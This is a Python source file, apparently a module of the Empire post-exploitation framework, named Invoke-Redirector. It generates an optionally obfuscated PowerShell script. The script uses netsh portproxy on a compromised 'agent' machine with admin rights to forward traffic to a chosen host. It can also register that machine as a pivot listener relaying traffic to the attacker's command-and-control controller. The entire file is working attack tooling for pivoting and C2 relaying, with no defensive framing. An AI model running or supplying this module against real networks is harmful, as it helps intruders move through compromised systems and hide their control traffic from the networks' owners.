from lib.common import helpers
class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Redirector',

            'Author': ['@harmj0y'],

            'Description': ('Sets the current agent to open up a port that '
                            'redirects all traffic to a target. If a listener '
                            'if specified, this machine is set up as a pivot listener '
                            'and all traffic is relayed to the controller. This then '
                            'shows up as a pivot listener in listener management. '),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'OpsecSafe' : True,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ShowAll' : {
                'Description'   :   'Switch. Show all current redirectors.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Reset' : {
                'Description'   :   'Switch. Reset all redirectors on the host',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ListenPort' : {
                'Description'   :   'Port to redirect from the agent machine',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ConnectHost' : {
                'Description'   :   'HOST:PORT or http[s]://HOST[:PORT] to redirect traffic to.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use for ConnectHost autoconfig.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'AddAsListener' : {
                'Description'   :   'Switch. Add pivot as a listener in the controller.',
                'Required'      :   False,
                'Value'         :   'True'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        script = """
function Invoke-Redirector {
    param($ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)

    if($ShowAll){
        $out = netsh interface portproxy show all
        if($out){
            $out
        }
        else{
            "[*] no redirectors currently configured"
        }
    }
    elseif($Reset){
        $out = netsh interface portproxy reset
        if($out){
            $out
        }
        else{
            "[+] successfully removed all redirectors"
        }
    }
    else{
        if((-not $ListenPort)){
            "[!] netsh error: required option not specified"
        }
        else{
            $ConnectAddress = ""
            $ConnectPort = ""
            
            $parts = $ConnectHost -split(":")
            if($parts.Length -eq 2){
                # if the form is http[s]://HOST or HOST:PORT
                if($parts[0].StartsWith("http")){
                    $ConnectAddress = $parts[1] -replace "//",""
                    if($parts[0] -eq "https"){
                        $ConnectPort = "443"
                    }
                    else{
                        $ConnectPort = "80"
                    }
                }
                else{
                    $ConnectAddress = $parts[0]
                    $ConnectPort = $parts[1]
                }
            }
            elseif($parts.Length -eq 3){
                # if the form is http[s]://HOST:PORT
                $ConnectAddress = $parts[1] -replace "//",""
                $ConnectPort = $parts[2]
            }
            if($ConnectPort -ne ""){
            
                $out = netsh interface portproxy add v4tov4 listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
                if($out){
                    $out
                }
                else{
                    "[+] successfully added redirector on port $ListenPort to $ConnectHost"
                }
            }
            else{
                "[!] netsh error: host not in http[s]://HOST:[PORT] format"
            }
        }
    }
}
Invoke-Redirector"""
        
        addAsListener = False
        listenerName = False

        for option,values in self.options.iteritems():
            if option.lower() == "listener" and values['Value'] != '':
                # extract out all options from a listener if one is set
                if not self.mainMenu.listeners.is_listener_valid(values['Value']):
                    print helpers.color("[!] Invalid listener set")
                    return ""
                else:
                    listenerName = values['Value']
                    # get the listener options and set them for the script
                    [Name,Host,Port,CertPath,StagingKey,DefaultDelay,DefaultJitter,DefaultProfile,KillDate,WorkingHours,DefaultLostLimit,BindIP,ServerVersion] = self.mainMenu.listeners.activeListeners[listenerName]['options']
                    script += " -ConnectHost " + str(Host)

            elif option.lower() != "agent":
                # check if we're adding this redirector as a pivot listener
                if option == "AddAsListener" and values['Value'] and values['Value'].lower() == "true":
                    addAsListener = True
                else:
                    # add the script args
                    if values['Value'] and values['Value'] != '':
                        if values['Value'].lower() == "true":
                            # if we're just adding a switch
                            script += " -" + str(option)
                        else:
                            script += " -" + str(option) + " " + str(values['Value']) 
        if addAsListener:
            if listenerName:
                # if we're add this as a pivot listener
                agent = self.options['Agent']['Value']
                port = self.options['ListenPort']['Value']
                self.mainMenu.listeners.add_pivot_listener(listenerName, agent, port)
                print helpers.color("[*] Added pivot listener on port " + str(port))
            else:
                print helpers.color("[!] Listener not set, pivot listener not added.")
                return ""
        if obfuscate:
            script = helpers.obfuscate(psScript=script, obfuscationCommand=obfuscationCommand)
        return script
